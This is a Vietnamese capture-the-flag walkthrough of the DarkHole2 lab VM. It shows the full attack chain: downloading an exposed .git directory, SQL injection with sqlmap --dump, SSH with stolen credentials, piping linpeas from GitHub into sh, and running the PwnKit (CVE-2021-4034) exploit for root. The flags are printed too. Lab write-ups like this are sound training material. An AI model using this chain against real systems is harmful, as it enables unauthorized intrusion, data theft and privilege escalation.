## Step 1
netdiscover để tìm ip của victim

![image](https://user-images.githubusercontent.com/97771705/225805841-85f266be-c64b-4b53-95a5-cc1f1f722dca.png)

tìm các port

![image](https://user-images.githubusercontent.com/97771705/225805936-100a2dcb-6c7e-488d-b179-b753690af67a.png)

Truy cập vào darkhole2 

![image](https://user-images.githubusercontent.com/97771705/225806006-ba48ed03-1338-4451-9d9e-6ce931973de8.png)

Sử dụng dirsearch, tìm được khá nhiều trang web

![image](https://user-images.githubusercontent.com/97771705/225806267-66d1a618-c75b-44f4-8de1-ed27f2f264c3.png)

Có trang login.php.... Nhưng k có register :)

![image](https://user-images.githubusercontent.com/97771705/225806877-a701701c-baa3-47f5-a213-3773d92756e4.png)

Ngoài ra còn có url /.git

![image](https://user-images.githubusercontent.com/97771705/225806957-42d1d0b9-36a9-4121-b816-45bbdb9ad6b2.png)

Down về coi thử 

> wget -r http://192.168.77.250/.git

![image](https://user-images.githubusercontent.com/97771705/225808080-cac03a26-8b51-40c0-8025-fc4148bee746.png)

Sử dụng lệnh git log để xem lịch sử các commit trong repository

![image](https://user-images.githubusercontent.com/97771705/225808243-257c40be-d48a-43ea-b38b-ed66c9237022.png)

Ta thấy ở lệnh thứ 2, author đã thêm login.php với default credentials

Sử dụng lệnh git diff để so sánh sự khác nhau giữa 2 commit, điền 1 tham số là hash của lệnh thứ 2 để mặc định so sánh nó với commit cuối cùng (muốn so sánh 2 commit thì điền tham số hash của từng lệnh)

> git diff a4d900a8d85e8938d3601f3cef113ee293028e10

Nhấn giữ arrow key down để đọc hết các phần bị thay đổi. Khí kéo đến trang login.php thì phát hiện infomation disclosure 

![image](https://user-images.githubusercontent.com/97771705/225810416-2e69a185-9fd3-4818-9d5b-4a47f412850b.png)

Đây chính là acc của trang login.php

Login thử, và boom !!!

![image](https://user-images.githubusercontent.com/97771705/225810568-da039043-7f20-4d31-a8e8-dcdea1b8eba0.png)

## Step 2
Tại bước này cứ nghĩ là có IDOR vì change id=2,3,4 ... đều được hết. Nhưng không có cái trang nào có thông tin nữa :(

Thử 1 paylaod đơn giản xem có bị dính SQLi không

> ' order by 7 -- -

Khi order by 7 thì trang bị lỗi :) -> dính SQLi rồi

![image](https://user-images.githubusercontent.com/97771705/225812296-1ef5d23e-aba7-42f5-af85-db087c621dea.png)

Sử dụng sqlmap để dò thôi :)

> sqlmap -u "http://192.168.77.250/dashboard.php?id=1" --cookie="PHPSESSID=mm3m2qe16hm964aoqlq4kdkfe7" --dump

(Dump sử dụng để truy xuất và lấy dữ liệu từ các bảng của cơ sở dữ liệu bằng cách thực hiện các truy vấn SQL thích hợp)

Database là mysql 

![image](https://user-images.githubusercontent.com/97771705/225816170-1f0cea10-8134-43c0-9e04-f274205db324.png)

Có 2 cách khai thác là UNION attack và time based

![image](https://user-images.githubusercontent.com/97771705/225816264-60bd7b1e-c82b-40f3-9e05-c3b3f1ae3f43.png)

Database có 2 table, table user không có gì đặc biệt

![image](https://user-images.githubusercontent.com/97771705/225816453-76f32182-3de2-4d07-9050-cf66475dde10.png)

Nhưng tables ssh lại có username và pass để ssh 

![image](https://user-images.githubusercontent.com/97771705/225816570-78f6e3a0-3cc4-427f-a1a1-d2ad1e0c1032.png)

Thử ssh

![image](https://user-images.githubusercontent.com/97771705/225816689-e22c661e-87a9-4b16-ac3b-d24c0b009d05.png)

Flag đầu: DarkHole{'This_is_the_life_man_better_than_a_cruise'}

![image](https://user-images.githubusercontent.com/97771705/225816888-e01d2566-1625-4aa0-b3e0-24dabf37afb3.png)

## Step 3
Sử dụng linpeas để check CVE. Command tại https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

Có 2 CVE.. thử cái đầu xem nào :)

![image](https://user-images.githubusercontent.com/97771705/225817364-0d66ed5f-1b25-4608-b666-2b0a6aa667c0.png)

Tìm thấy code exploit trên github https://github.com/berdav/CVE-2021-4034

Down về rồi make, sau đó copy folder sang máy victim

![image](https://user-images.githubusercontent.com/97771705/225852696-1d60a865-5979-4274-91a1-d6bdb9a14c59.png)

>scp -r CVE-2021-4034-main/ jehad@192.168.77.250:/tmp

![image](https://user-images.githubusercontent.com/97771705/225852060-8a499448-8a7b-43fa-b030-a30355df835f.png)

![image](https://user-images.githubusercontent.com/97771705/225852121-121befeb-d093-47d5-b783-cee4fddd8e4b.png)

Xin nhẹ flag cuối :) : DarkHole{'Legend'}

![image](https://user-images.githubusercontent.com/97771705/225853055-9b774122-84b1-41ad-a7e8-32d8fa2a6ab3.png)

